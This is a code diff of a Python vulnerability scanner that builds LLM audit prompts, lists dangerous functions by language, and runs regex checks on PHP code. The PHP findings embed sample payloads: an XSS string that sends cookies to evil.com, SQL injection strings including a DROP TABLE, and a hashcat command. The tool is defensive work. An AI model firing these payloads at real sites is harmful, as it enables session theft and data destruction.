@@ -278,91 +278,195 @@ class SecurityAnalyzer:
     def __init__(self):
         self.vulnerability_categories = {
             "injection": [
-                "SQL Injection",
-                "Command Injection",
-                "Code Injection",
-                "Template Injection"
+                "SQL Injection", "Command Injection", "Code Injection",
+                "LDAP Injection", "XPath Injection",
+                "Server-Side Template Injection (SSTI)",
+                "Header Injection", "Email Header Injection",
             ],
             "rce": [
-                "Remote Code Execution",
-                "Arbitrary Code Execution",
-                "Unsafe Deserialization"
+                "Remote Code Execution", "Arbitrary Code Execution",
+                "Unsafe Deserialization / Object Injection",
+                "Dynamic Code Evaluation",
             ],
-            "auth": [
-                "Authentication Bypass",
-                "Authorization Bypass",
-                "Privilege Escalation"
+            "path_traversal": [
+                "Directory Traversal", "Path Traversal",
+                "Arbitrary File Read", "Arbitrary File Write",
+                "Local File Inclusion (LFI)", "Remote File Inclusion (RFI)",
             ],
-            "data": [
-                "Sensitive Data Exposure",
-                "Information Disclosure",
-                "Data Leakage"
+            "ssrf": [
+                "Server-Side Request Forgery (SSRF)", "Blind SSRF",
             ],
-            "csrf": [
-                "Cross-Site Request Forgery"
+            "xxe": [
+                "XML External Entity Injection (XXE)", "XML Injection",
             ],
             "xss": [
-                "Cross-Site Scripting (Stored, Reflected, DOM-based)"
+                "Cross-Site Scripting — Reflected",
+                "Cross-Site Scripting — Stored",
+                "Cross-Site Scripting — DOM-based",
+                "HTML Injection",
+            ],
+            "open_redirect": [
+                "Open Redirect", "Unvalidated URL Redirect",
+            ],
+            "auth": [
+                "Authentication Bypass", "Authorization Bypass",
+                "Privilege Escalation", "Broken Access Control",
+                "Insecure Direct Object Reference (IDOR)",
+                "Missing Function-Level Access Control",
+            ],
+            "session": [
+                "Session Fixation", "Session Hijacking",
+                "Insecure Session Configuration", "Missing Session Expiration",
+            ],
+            "crypto": [
+                "Weak Cryptographic Algorithm (MD5/SHA1 for passwords)",
+                "Insecure Randomness (rand/Math.random for security tokens)",
+                "Hardcoded Credentials or Secrets",
+                "Broken Password Storage",
+                "Missing or Weak Encryption",
+            ],
+            "csrf": [
+                "Cross-Site Request Forgery (CSRF)",
+            ],
+            "data": [
+                "Sensitive Data Exposure", "Information Disclosure",
+                "Verbose Error Messages", "Sensitive Data in Logs",
+                "Data Leakage via API Response",
             ],
             "misconfiguration": [
-                "Security Misconfiguration",
-                "Insecure Default Configurations"
+                "Security Misconfiguration", "Debug Mode in Production",
+                "Insecure Default Configurations",
+                "Unnecessary Features / Services Enabled",
+                "Missing Security Headers",
             ],
             "insecure_design": [
-                "Insecure Design"
+                "Insecure Design", "Race Condition / TOCTOU",
+                "Business Logic Vulnerability",
+                "Mass Assignment / Parameter Pollution",
             ],
-            "business_logic": [
-                "Business Logic Vulnerabilities"
-            ]
         }
 
         self.language_specific_checks = {
             "php": {
                 'critical_functions': [
-                    "eval()",
-                    "system()",
-                    "exec()",
-                    "shell_exec()",
-                    "passthru()",
-                    "unserialize()",
-                    "include()/require()",
-                    "file_get_contents()",
-                    "mysql_query()",
-                    "echo without htmlspecialchars()",
-                    "md5() for passwords",
-                    "sha1() for passwords",
-                    "direct HTML output of variables",
-                    "unvalidated img src attributes"
+                    # Code execution
+                    "eval()", "assert() with user input", "create_function()",
+                    "preg_replace() with /e modifier",
+                    # OS command execution
+                    "system()", "exec()", "shell_exec()", "passthru()",
+                    "popen()", "proc_open()", "pcntl_exec()",
+                    # Deserialization
+                    "unserialize()", "json_decode() feeding into unserialize()",
+                    # File operations
+                    "include()/require() with user input",
+                    "include_once()/require_once() with user input",
+                    "file_get_contents() with URL", "file_put_contents()",
+                    "move_uploaded_file()", "readfile()", "fopen()",
+                    # Database (legacy)
+                    "mysql_query()", "mysqli_query() without prepared statements",
+                    # Variable injection
+                    "extract($_GET/$_POST/$_REQUEST/$_COOKIE)",
+                    "parse_str() without second arg", "$$variable (variable variables)",
+                    # Weak crypto / hashing
+                    "md5() for passwords", "sha1() for passwords",
+                    "rand()/mt_rand() for security tokens",
+                    # XSS
+                    "echo/print of unescaped user input",
+                    "header() without sanitization (open redirect/injection)",
+                    # XXE
+                    "simplexml_load_string()", "DOMDocument::loadXML()",
+                    "SimpleXMLElement()", "XMLReader",
+                    # SSRF
+                    "curl_exec() with user-controlled URL",
+                    "file_get_contents() with user-controlled URL",
+                    # Session
+                    "session_id() with user input (session fixation)",
+                    # Mail injection
+                    "mail() with user-controlled headers",
                 ],
-                'dangerous_patterns': [
-                    {"pattern": r"md5\s*\(\s*\$pass", "name": "Insecure Password Hashing", "severity": "critical"},
-                    {"pattern": r"<.*?>\s*{\s*\$.+?\s*}\s*<", "name": "Potential XSS", "severity": "high"},
-                    {"pattern": r"<img.*?src\s*=\s*[\"\']\s*{\s*\$.+?\s*}\s*[\"\']\s*[^>]*>", "name": "XSS via Image Source", "severity": "high"}
-                ]
             },
             "python": {
                 'critical_functions': [
-                    "eval()",
-                    "exec()",
-                    "os.system()",
-                    "subprocess.call()",
-                    "pickle.loads()",
-                    "input()",
-                    "yaml.load()",
-                    "sqlite3.execute()"
-                ]
+                    # Code execution
+                    "eval()", "exec()", "compile()", "__import__()",
+                    "importlib.import_module() with user input",
+                    # OS commands
+                    "os.system()", "os.popen()", "os.exec*()",
+                    "subprocess.call()", "subprocess.run(shell=True)",
+                    "subprocess.Popen(shell=True)", "commands.getoutput()",
+                    # Deserialization
+                    "pickle.loads()", "pickle.load()", "marshal.loads()",
+                    "shelve.open()", "yaml.load() without Loader",
+                    "jsonpickle.decode()",
+                    # Templating
+                    "jinja2.Template() with user input",
+                    "Mako / Tornado template with user input",
+                    # Weak crypto
+                    "hashlib.md5() for passwords", "hashlib.sha1() for passwords",
+                    "random.random()/random.randint() for security tokens",
+                    # SQL
+                    "sqlite3.execute() with string formatting",
+                    "cursor.execute() with % or .format()",
+                    # XML
+                    "xml.etree.ElementTree.parse() — XXE risk",
+                    "lxml.etree without resolve_entities=False",
+                    # SSRF
+                    "urllib.request.urlopen() with user input",
+                    "requests.get/post() with user-controlled URL",
+                    # File ops
+                    "open() in write mode with user-controlled path",
+                    "tempfile.mktemp() (TOCTOU race condition)",
+                ],
             },
             "javascript": {
                 'critical_functions': [
-                    "eval()",
-                    "Function()",
-                    "setTimeout()/setInterval() with string",
-                    "innerHTML",
-                    "document.write()",
-                    "dangerouslySetInnerHTML",
-                    "child_process.exec()"
-                ]
-            }
+                    # Code execution
+                    "eval()", "new Function()", "setTimeout(string)",
+                    "setInterval(string)", "execScript()",
+                    # XSS sinks
+                    "innerHTML", "outerHTML", "insertAdjacentHTML()",
+                    "document.write()", "document.writeln()",
+                    "$.html() (jQuery)", "dangerouslySetInnerHTML (React)",
+                    "v-html (Vue)", "bypassSecurityTrust* (Angular)",
+                    # Open redirect
+                    "window.location = user_input",
+                    "location.href = user_input",
+                    # Prototype pollution
+                    "Object.assign() with user input",
+                    "merge/extend functions with user input",
+                    # Node.js / server-side
+                    "child_process.exec()", "child_process.execSync()",
+                    "child_process.spawn(shell:true)",
+                    "require() with user input",
+                    # Weak crypto
+                    "Math.random() for security tokens",
+                    "crypto.createHash('md5') for passwords",
+                    # Storage
+                    "localStorage.setItem() with sensitive data",
+                    "document.cookie with missing Secure/HttpOnly",
+                    # PostMessage
+                    "postMessage() without origin validation",
+                    "addEventListener('message') without origin check",
+                    # SSRF (Node)
+                    "http.get() with user-controlled URL",
+                    "axios.get() with user-controlled URL",
+                ],
+            },
+            "java": {
+                'critical_functions': [
+                    "Runtime.exec()", "ProcessBuilder with user input",
+                    "ObjectInputStream.readObject() — deserialization",
+                    "XMLDecoder.readObject() — deserialization",
+                    "Statement.execute() without PreparedStatement",
+                    "XPath.evaluate() with user input — injection",
+                    "ScriptEngine.eval() with user input",
+                    "Class.forName() with user input",
+                    "URL(user_input).openStream() — SSRF",
+                    "MessageFormat.format() with user input — injection",
+                    "Random() for security tokens — use SecureRandom",
+                    "MD5/SHA1 MessageDigest for passwords",
+                ],
+            },
         }
 
         self.severity_levels = {
@@ -390,93 +494,165 @@ class SecurityAnalyzer:
         return None
 
     def create_enhanced_prompt(self, code: str, language: str = None) -> str:
-        severity_formats = {
-            "CRITICAL": "Critical",
-            "HIGH": "High",
-            "MEDIUM": "Medium",
-            "LOW": "Low",
-            "INFO": "Info",
-            "SECURE": "Secure"
-        }
-
-        severity_legend = "\nSEVERITY LEVELS:\n"
-        for severity, formatted in severity_formats.items():
-            severity_legend += f"- {formatted}: {self._get_severity_description(severity)}\n"
-
         lang = language if language else "code"
-        base_prompt = f"""You are a security expert. Analyze the following {lang} for vulnerabilities.
 
-IMPORTANT: Be very careful to avoid false positives. Only report issues that you are confident are actual vulnerabilities with real security impact. If you're uncertain, classify it as INFO. If the code appears secure, explicitly state that no vulnerabilities were found.
-
-{severity_legend}
-
-For each confirmed finding, follow this EXACT format:
-
-## [SEVERITY_EMOJI SEVERITY] Vulnerability #N: TYPE
-
-Example headers:
-- ## [Critical] Vulnerability #1: Remote Code Execution
-- ## [High] Vulnerability #2: SQL Injection
-- ## [Medium] Vulnerability #3: XSS Vulnerability
-- ## [Low] Vulnerability #4: Information Disclosure
-- ## [Info] Note #1: Potential concern (not a confirmed vulnerability)
-
-Required sections for each finding:
-- **Location:** Lines [exact_start-exact_end]
-- **Code Snippet:**
-[Exact vulnerable code snippet]
-- **CWE:** [specific_id] - [name]
-- **OWASP:** [exact_category]
-- **Confidence:** [High/Medium/Low] - How certain you are this is a real vulnerability
-- **POC:**
-[Concise, technical exploit demonstrating the vulnerability]
-- **Impact:**
-[Brief description of consequences]
-- **Fix:**
-[Minimal code change to resolve the issue]
-
-If no vulnerabilities are found, start your analysis with:
-## [Secure] No Vulnerabilities Detected
-Then explain why the code appears secure and any best practices it follows.
-"""
-
-        if language and language.lower() == "php":
-            base_prompt += """
-PHP SECURITY CHECKLIST - VERIFY THESE ISSUES CAREFULLY:
-
-1. INSECURE PASSWORD STORAGE: If using md5() or sha1() for passwords, this is a Critical vulnerability.
-
-2. XSS VULNERABILITIES:
-   - Direct output of variables without htmlspecialchars() is vulnerable
-   - Check all echo, print statements and string concatenation with $html .=
-   - URLs in <a href> and <img src> attributes need validation
-
-3. FILE UPLOAD SECURITY:
-   - Always validate MIME type AND content, not just extensions
-   - Check where files are stored - web-accessible folders are risky
-   - Ensure filenames are sanitized with basename()
-
-4. SQL INJECTION: Must use prepared statements with bound parameters.
-
-5. SESSION SECURITY: Check for proper session management and validation.
-
-Remember: err on the side of reporting issues rather than missing them.
-"""
-
-        base_prompt += "\n\nVULNERABILITY CATEGORIES TO CHECK:"
+        # Build category checklist
+        category_block = ""
         for category, checks in self.vulnerability_categories.items():
-            cat_upper = category.upper()
-            checks_str = ", ".join(checks)
-            severity_indicator = self._get_severity_indicator(category)
-            base_prompt += f"\n- {severity_indicator} {cat_upper}: {checks_str}"
+            indicator = self._get_severity_indicator(category)
+            category_block += f"\n  {indicator} {category.upper()}: {', '.join(checks)}"
 
+        # Build language function list
+        lang_block = ""
         if language and language.lower() in self.language_specific_checks:
             funcs = self.language_specific_checks[language.lower()]['critical_functions']
-            base_prompt += f"\n\n{language.upper()} SPECIFIC CHECKS:"
-            base_prompt += f"\n- Review dangerous functions: {', '.join(funcs)}"
+            lang_block = f"\n\n{language.upper()} DANGEROUS FUNCTIONS/PATTERNS TO CHECK:\n"
+            for f in funcs:
+                lang_block += f"  • {f}\n"
 
-        base_prompt += "\n\nIMPORTANT: Before reporting any vulnerability, validate that it is exploitable and not just a theoretical concern. It is better to miss a low-severity issue than to report a false positive."
-        return base_prompt
+        # Language-specific deep analysis instructions
+        lang_deep = self._get_language_deep_analysis(language)
+
+        prompt = f"""You are a senior penetration tester and code security auditor with 15+ years of experience.
+Your job is to find EVERY security vulnerability in the {lang} code below — including subtle ones.
+
+━━━━━━━━━━━━━━━━━━ OUTPUT FORMAT ━━━━━━━━━━━━━━━━━━
+For EACH vulnerability use this EXACT format (do not skip any field):
+
+## [SEVERITY] Vulnerability #N: VULNERABILITY_TYPE
+
+- **Location:** Line(s) X or X-Y
+- **Code Snippet:**
+```
+<exact vulnerable code>
+```
+- **CWE:** CWE-XXX — Name
+- **OWASP 2021:** AXXXX — Category Name
+- **Confidence:** High | Medium | Low
+- **Attack Vector:** <who can exploit this and how>
+- **POC:** <minimal working exploit or proof of exploitability>
+- **Impact:** <what an attacker gains>
+- **Fix:**
+```
+<minimal corrected code>
+```
+
+Allowed SEVERITY values: Critical, High, Medium, Low, Info
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SEVERITY GUIDE:
+- Critical: Direct RCE, full auth bypass, critical data exposure — exploitable immediately
+- High: SQL injection, stored XSS, SSRF, deserialization, significant auth flaw
+- Medium: Reflected XSS, open redirect, CSRF, information disclosure
+- Low: Missing header, verbose error, low-impact misconfiguration
+- Info: Best-practice note, not directly exploitable
+
+━━━━━━━━━━━━━━━━━ WHAT TO LOOK FOR ━━━━━━━━━━━━━━━━━
+OWASP Top 10 (2021) — check ALL of these:
+  A01 Broken Access Control — IDOR, privilege escalation, missing authz
+  A02 Cryptographic Failures — MD5/SHA1 passwords, hardcoded secrets, weak random
+  A03 Injection — SQL, Command, LDAP, XPath, SSTI, Header injection
+  A04 Insecure Design — race conditions, logic flaws, mass assignment
+  A05 Security Misconfiguration — debug mode, verbose errors, default creds
+  A06 Vulnerable Components — outdated/dangerous library usage
+  A07 Auth Failures — session fixation, weak tokens, missing expiry
+  A08 Integrity Failures — unsafe deserialization, object injection
+  A09 Logging Failures — sensitive data in logs, missing audit trail
+  A10 SSRF — user-controlled URL fetching without validation
+{category_block}
+{lang_block}{lang_deep}
+
+━━━━━━━━━━━━━━━━━━ TAINT ANALYSIS ━━━━━━━━━━━━━━━━━━
+For each finding, mentally trace the data from SOURCE to SINK:
+  Sources: user input ($_GET/$_POST/$_REQUEST/$_COOKIE/argv/env/DB/file/network)
+  Sinks: DB queries, OS commands, file ops, HTML output, redirects, XML/URL parsers
+Report a vulnerability whenever tainted data reaches a dangerous sink without proper sanitization.
+
+━━━━━━━━━━━━━━━━━━━ INSTRUCTIONS ━━━━━━━━━━━━━━━━━━━
+1. Do NOT skip vulnerabilities because they seem "unlikely" to be exploited.
+2. Report ALL severity levels — do not limit yourself to Critical/High only.
+3. Check EVERY function call, not just obvious ones.
+4. Trace data flow through variables, function calls, and class properties.
+5. If the code is genuinely secure, begin your response with:
+   ## [Secure] No Vulnerabilities Detected
+   and explain your reasoning.
+
+━━━━━━━━━━━━━━━━━━━ CODE TO ANALYZE ━━━━━━━━━━━━━━━━━
+Language: {lang}
+
+```{lang}
+{code}
+```
+"""
+        return prompt
+
+    def _get_language_deep_analysis(self, language: str) -> str:
+        """Return language-specific deep analysis instructions."""
+        guides = {
+            "php": """
+PHP DEEP ANALYSIS CHECKLIST:
+  1. XSS: Check EVERY echo/print/<?= for unescaped variables. A single htmlspecialchars()
+     elsewhere in the file does NOT protect other output points.
+  2. SQL Injection: Any $_GET/$_POST/$_COOKIE/$_SESSION/$_SERVER directly in a query string
+     is injectable. Only bound parameters in prepared statements are safe.
+  3. Password Hashing: md5/sha1 of password = Critical. Must use password_hash(PASSWORD_BCRYPT).
+  4. File Upload: $_FILES with extension-only validation = Critical RCE risk.
+  5. Deserialization: unserialize() on user input = Critical (PHP Object Injection).
+  6. Variable Injection: extract(), parse_str(), $$var — can overwrite any variable.
+  7. Weak Randomness: rand()/mt_rand() for tokens/OTPs = Predictable values.
+  8. Path Traversal: include/require/readfile/file_get_contents with user input.
+  9. SSRF: curl or file_get_contents with user-controlled URL.
+  10. Open Redirect: header("Location: " . $user_input) without validation.
+  11. Session Fixation: session_id($_GET['sid']) lets attacker set session ID.
+  12. XXE: simplexml_load_string/DOMDocument::loadXML without disabling external entities.
+  13. Type Juggling: loose == comparisons with "0e..." hashes bypass auth.
+  14. assert() with string argument is eval() — RCE if user-controlled.
+""",
+            "python": """
+PYTHON DEEP ANALYSIS CHECKLIST:
+  1. Command Injection: os.system/subprocess with shell=True and user input = RCE.
+  2. Code Injection: eval()/exec()/compile() with user input = RCE.
+  3. Deserialization: pickle.loads/marshal.loads on untrusted data = RCE.
+  4. SSTI: Jinja2/Mako template rendered with unsanitized user input.
+  5. SQL Injection: cursor.execute("SELECT..." % user_input) — use ? placeholders.
+  6. XXE: xml.etree.ElementTree does not disable external entities by default.
+  7. SSRF: requests.get(user_url) without allowlist = SSRF.
+  8. Weak Crypto: hashlib.md5/sha1 for passwords; use bcrypt/argon2.
+  9. Insecure Random: random.random() for tokens — use secrets module.
+  10. Path Traversal: open(user_path) without normalization and root-checking.
+  11. YAML: yaml.load() without Loader=yaml.SafeLoader executes arbitrary Python.
+  12. Race Condition: tempfile.mktemp() is TOCTOU-vulnerable; use mkstemp().
+""",
+            "javascript": """
+JAVASCRIPT / NODE.JS DEEP ANALYSIS CHECKLIST:
+  1. XSS: innerHTML/outerHTML/insertAdjacentHTML/document.write with user data = XSS.
+  2. eval(): ANY eval/Function()/setTimeout(string) with user input = RCE/XSS.
+  3. Prototype Pollution: recursive merge of user-controlled objects can pollute Object.prototype.
+  4. Command Injection (Node): child_process.exec/execSync with user input = RCE.
+  5. Path Traversal (Node): fs.readFile(req.params.file) without path normalization.
+  6. Open Redirect: res.redirect(req.query.url) without validation.
+  7. Insecure Random: Math.random() for tokens — use crypto.randomBytes().
+  8. PostMessage: addEventListener('message', fn) must verify event.origin.
+  9. Regex DoS (ReDoS): catastrophic backtracking in regex applied to user input.
+  10. JWT: verify() must check algorithm — none algorithm bypass.
+  11. SSRF (Node): http.get/axios with user-controlled URL.
+  12. Sensitive storage: tokens/passwords in localStorage are accessible to XSS.
+""",
+            "java": """
+JAVA DEEP ANALYSIS CHECKLIST:
+  1. SQL Injection: Statement.execute() — must use PreparedStatement with parameters.
+  2. Deserialization: ObjectInputStream.readObject() on untrusted data = RCE.
+  3. XXE: DocumentBuilderFactory without setFeature(DISALLOW_DOCTYPE_DECL).
+  4. Command Injection: Runtime.exec()/ProcessBuilder with user input.
+  5. Path Traversal: new File(userInput) without canonicalization check.
+  6. SSTI: FreeMarker/Velocity template with user-controlled template string.
+  7. Weak Crypto: MD5/SHA1 for passwords; use bcrypt/PBKDF2.
+  8. Insecure Random: new Random() for tokens — use SecureRandom.
+  9. SSRF: URL(userInput).openStream() without allowlist.
+  10. Open Redirect: response.sendRedirect(request.getParameter("url")).
+""",
+        }
+        return guides.get(language.lower() if language else "", "")
 
     def _get_severity_description(self, severity: str) -> str:
         descriptions = {
@@ -594,6 +770,17 @@ Remember: err on the side of reporting issues rather than missing them.
         if not content:
             raise ValueError("Empty response content")
 
+        # Run deterministic checks for supported languages and merge findings
+        deterministic = None
+        lang = (language or "").lower()
+        if lang == "python":
+            deterministic = verify_python_security(code)
+        elif lang == "javascript":
+            deterministic = verify_javascript_security(code)
+
+        if deterministic:
+            content = deterministic + "\n\n---\n\n### AI Analysis\n\n" + content
+
         processed_content = self._add_summary(content)
         return {
             "status": "success",
@@ -664,23 +851,38 @@ def _batch_verify_vulnerabilities(vulnerabilities: list, api_type: str) -> list:
 
 def extract_vulnerabilities(analysis_text: str) -> list:
     """Extracts individual vulnerabilities from the analysis text."""
-    vulnerability_pattern = r"##\s*\[(?:Critical|High|Medium|Low)\]\s*Vulnerability\s*#(\d+):\s*([^\n]+)"
-    vulnerability_matches = list(re.finditer(vulnerability_pattern, analysis_text))
+    # Case-insensitive match; also accept "Vuln" abbreviation
+    vulnerability_pattern = re.compile(
+        r"##\s*\[(Critical|High|Medium|Low)\]\s*Vulnerability\s*#(\d+):\s*([^\n]+)",
+        re.IGNORECASE,
+    )
+    vulnerability_matches = list(vulnerability_pattern.finditer(analysis_text))
+
+    emoji_map = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}
+    # Canonical capitalisation
+    severity_canon = {"critical": "Critical", "high": "High", "medium": "Medium", "low": "Low"}
 
     vulnerabilities = []
     for i, match in enumerate(vulnerability_matches):
-        number, vuln_type = match.groups()
+        sev_raw, number, vuln_type = match.groups()
+        severity = severity_canon.get(sev_raw.lower(), sev_raw.capitalize())
+        emoji = emoji_map.get(sev_raw.lower(), "")
 
-        # Determine severity from the header
-        severity_match = re.search(r"\[(Critical|High|Medium|Low)\]", match.group(0))
-        severity = severity_match.group(1) if severity_match else "Unknown"
-        emoji_map = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🟢"}
-        emoji = emoji_map.get(severity, "")
+        segment = analysis_text[match.end():]
 
-        location_match = re.search(r"\*\*Location:\*\*\s*Lines\s*([\d\-]+)", analysis_text[match.end():], re.DOTALL)
+        # Accept "Line X", "Lines X", "Lines X-Y", "Line ~X"
+        location_match = re.search(
+            r"\*\*Location:\*\*\s*(?:Lines?\s*~?)?([\d\-,]+)",
+            segment,
+            re.IGNORECASE,
+        )
         location = location_match.group(1) if location_match else "Unknown"
 
-        snippet_match = re.search(r"\*\*Code Snippet:\*\*\s*```[^\n]*\n(.*?)```", analysis_text[match.end():], re.DOTALL)
+        snippet_match = re.search(
+            r"\*\*Code Snippet:\*\*\s*```[^\n]*\n(.*?)```",
+            segment,
+            re.DOTALL,
+        )
         code_snippet = snippet_match.group(1).strip() if snippet_match else ""
 
         end_pos = vulnerability_matches[i + 1].start() if i + 1 < len(vulnerability_matches) else len(analysis_text)
@@ -692,7 +894,7 @@ def extract_vulnerabilities(analysis_text: str) -> list:
             "type": vuln_type.strip(),
             "location": location,
             "code_snippet": code_snippet,
-            "full_content": analysis_text[match.start():end_pos].strip()
+            "full_content": analysis_text[match.start():end_pos].strip(),
         })
 
     return vulnerabilities
@@ -758,87 +960,577 @@ def verify_all_vulnerabilities(analysis_text: str, api_type: str, confidence_thr
     return new_analysis
 
 
-def verify_php_security(code: str, analysis_results: str) -> str:
-    """Performs additional PHP-specific security checks that AI might miss.
-    Returns a formatted result string if new issues are found, otherwise None."""
-    issues = []
+def _strip_code_comments(code: str, language: str) -> str:
+    """Remove comments so regex checks do not fire on commented-out code."""
+    lang = (language or "").lower()
+    if lang in ("php", "javascript", "java", "c++", "csharp"):
+        code = re.sub(r'/\*.*?\*/', ' ', code, flags=re.DOTALL)
+        code = re.sub(r'//[^\n]*', ' ', code)
+    if lang == "php":
+        code = re.sub(r'#[^\n]*', ' ', code)
+    elif lang == "python":
+        code = re.sub(r'#[^\n]*', ' ', code)
+        code = re.sub(r'""".*?"""', ' ', code, flags=re.DOTALL)
+        code = re.sub(r"'''.*?'''", ' ', code, flags=re.DOTALL)
+    return code
 
-    # Check for insecure password hashing
-    if re.search(r"md5\s*\(\s*\$(?:pass|password)", code):
-        match = re.search(r"(.*md5\s*\(\s*\$(?:pass|password)[^\n]*)", code)
-        snippet = match.group(1).strip() if match else "md5($password)"
-        issues.append({
+
+def _fmt_issue(i: int, issue: dict, lang: str = "php") -> str:
+    """Format a deterministic finding into the standard markdown report block."""
+    return (
+        f"## [{issue['severity']}] Vulnerability #{i}: {issue['type']}\n\n"
+        f"- **Location:** {issue.get('location', 'See snippet')}\n"
+        f"- **Code Snippet:**\n```{lang}\n{issue['snippet']}\n```\n"
+        f"- **CWE:** {issue.get('cwe', 'N/A')}\n"
+        f"- **OWASP 2021:** {issue.get('owasp', 'N/A')}\n"
+        f"- **Confidence:** High\n"
+        f"- **Attack Vector:** {issue.get('attack_vector', 'Attacker-controlled input reaches a dangerous sink.')}\n"
+        f"- **POC:** {issue.get('poc', 'See description.')}\n"
+        f"- **Impact:** {issue['description']}\n"
+        f"- **Fix:**\n```{lang}\n{issue['fix']}\n```\n\n"
+    )
+
+
+def verify_php_security(code: str, analysis_results: str) -> str:
+    """Deterministic PHP security checks covering all major vulnerability classes.
+    Always runs regardless of AI result — merges new findings with existing ones."""
+    clean = _strip_code_comments(code, "php")
+    lines = code.splitlines()
+    issues = []
+    seen_types: set = set()
+
+    def _first_line(pattern: str, src: str = clean) -> tuple[str, str]:
+        """Return (snippet, location) for the first match of pattern in src."""
+        m = re.search(pattern, src, re.IGNORECASE | re.DOTALL)
+        if not m:
+            return "", ""
+        snippet = m.group(0)[:200].strip()
+        # Find approximate line number in original code
+        line_no = code[:m.start()].count('\n') + 1 if src is clean else "?"
+        return snippet, f"Line ~{line_no}"
+
+    def _add(issue: dict):
+        if issue["type"] not in seen_types:
+            seen_types.add(issue["type"])
+            issues.append(issue)
+
+    # ── 1. Insecure password hashing (MD5 / SHA1) ──────────────────────────
+    pwd_pattern = r"""(?:md5|sha1)\s*\(\s*(?:\$_(?:POST|GET|REQUEST|COOKIE)\[|trim\s*\(\s*\$|\$(?!\w*html|\w*token|\w*key|\w*id)[a-zA-Z_]\w*\s*(?:\.|,|\)))"""
+    snippet, loc = _first_line(pwd_pattern)
+    if snippet:
+        _add({
             "type": "Insecure Password Hashing",
             "severity": "Critical",
-            "description": "MD5 is cryptographically broken and unsuitable for password storage.",
+            "location": loc,
             "snippet": snippet,
-            "fix": "Use password_hash() and password_verify() instead."
+            "cwe": "CWE-916 — Use of Password Hash With Insufficient Computational Effort",
+            "owasp": "A02:2021 — Cryptographic Failures",
+            "attack_vector": "Attacker dumps the DB and cracks MD5/SHA1 hashes offline in seconds.",
+            "poc": "hashcat -a 0 -m 0 hashes.txt rockyou.txt",
+            "description": "MD5 and SHA1 are cryptographically broken and trivially crackable. Never use them for passwords.",
+            "fix": "password_hash($password, PASSWORD_BCRYPT);\n// verify: password_verify($input, $hash)",
         })
 
-    # Check for XSS via unescaped output
-    echo_vars = re.findall(r'(?:echo|print|<\?=)\s*(?:"[^"]*\$[^"]*"|\'[^\']*\$[^\']*\'|\$[a-zA-Z0-9_]+)', code)
-    html_vars = re.findall(r'\$html\s*\.=\s*["\'][^"\']*\$[^"\']*["\']', code)
-    if (echo_vars or html_vars) and not re.search(r"htmlspecialchars\s*\(", code):
-        snippet = (echo_vars[0] if echo_vars else html_vars[0] if html_vars else "$variable").strip()
-        issues.append({
-            "type": "Cross-Site Scripting (XSS)",
+    # ── 2. XSS — per-line check (NOT file-wide) ───────────────────────────
+    xss_output_pattern = re.compile(
+        r'(?:echo|print|<\?=)\s*(?:["\'][^"\']*\$[^"\']*["\']|\$(?:_(?:GET|POST|REQUEST|COOKIE|SERVER|ENV)\b|\w+(?:\[.*?\])?)\s*(?:;|\.|\,|\)|\s*$))',
+        re.IGNORECASE
+    )
+    dangerous_echo_lines = []
+    for lineno, line in enumerate(lines, 1):
+        clean_line = _strip_code_comments(line, "php").strip()
+        if xss_output_pattern.search(clean_line) and not re.search(r'htmlspecialchars|htmlentities|strip_tags|intval|floatval|filter_var', clean_line, re.IGNORECASE):
+            dangerous_echo_lines.append((lineno, line.strip()))
+    if dangerous_echo_lines:
+        sample = "\n".join(f"// Line {ln}: {ln_code}" for ln, ln_code in dangerous_echo_lines[:3])
+        _add({
+            "type": "Cross-Site Scripting (XSS) — Unescaped Output",
             "severity": "High",
-            "description": "Output contains unencoded variables, leading to XSS vulnerabilities.",
+            "location": f"Lines {', '.join(str(ln) for ln, _ in dangerous_echo_lines[:5])}",
+            "snippet": sample,
+            "cwe": "CWE-79 — Improper Neutralization of Input During Web Page Generation",
+            "owasp": "A03:2021 — Injection",
+            "attack_vector": "Attacker injects <script> via GET/POST parameter; victim browser executes it.",
+            "poc": "?name=<script>fetch('https://evil.com/?c='+document.cookie)</script>",
+            "description": "Variables are echoed directly to HTML without escaping, enabling stored or reflected XSS.",
+            "fix": "echo htmlspecialchars($var, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');",
+        })
+
+    # ── 3. SQL injection — string concatenation into queries ──────────────
+    sqli_pattern = r'(?:mysql[i]?_query|->query|->prepare\s*\(\s*"[^"]*\.\s*\$|PDO::query)\s*\(\s*["\'][^"\']*(?:\.\s*\$|\$[a-zA-Z_]\w*(?:\[.*?\])?)[^"\']*["\']'
+    snippet, loc = _first_line(sqli_pattern)
+    if not snippet:
+        # Also catch direct variable interpolation in query strings
+        sqli_pattern2 = r'(?:mysql[i]?_query|->query|->prepare)\s*\(\s*"[^"]*\$(?:_(?:GET|POST|REQUEST|COOKIE)|[a-zA-Z_]\w*)[^"]*"'
+        snippet, loc = _first_line(sqli_pattern2)
+    if snippet:
+        _add({
+            "type": "SQL Injection",
+            "severity": "Critical",
+            "location": loc,
             "snippet": snippet,
-            "fix": "Use htmlspecialchars($var, ENT_QUOTES, 'UTF-8') for all output containing user data."
+            "cwe": "CWE-89 — SQL Injection",
+            "owasp": "A03:2021 — Injection",
+            "attack_vector": "Attacker manipulates GET/POST parameter to alter query logic.",
+            "poc": "?id=1 OR 1=1-- (dump all rows) | ?id=1; DROP TABLE users--",
+            "description": "User input is concatenated directly into SQL queries allowing arbitrary query manipulation.",
+            "fix": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);",
         })
 
-    # Check for unsafe image source
-    img_match = re.search(r'(<img[^>]*src\s*=\s*["\']?\s*\$[^>]*>)', code)
-    if img_match:
-        issues.append({
-            "type": "Stored XSS via Image",
-            "severity": "High",
-            "description": "Unsanitized variables in image src attributes can lead to XSS.",
-            "snippet": img_match.group(1)[:120],
-            "fix": "Validate and sanitize all URLs before using them in img tags."
-        })
-
-    # Check for file upload vulnerabilities
-    if re.search(r"\$_FILES", code):
-        suspicious_paths = re.search(r"(uploads|hackable|www|public_html|web)", code, re.IGNORECASE)
-        extension_only_validation = re.search(r"strtolower\s*\(\s*\$\w+_ext\s*\)", code)
-        web_accessible = not re.search(r"\.htaccess|AddHandler", code)
-
-        if suspicious_paths and extension_only_validation and web_accessible:
-            # Extract actual upload path from code rather than hardcoding
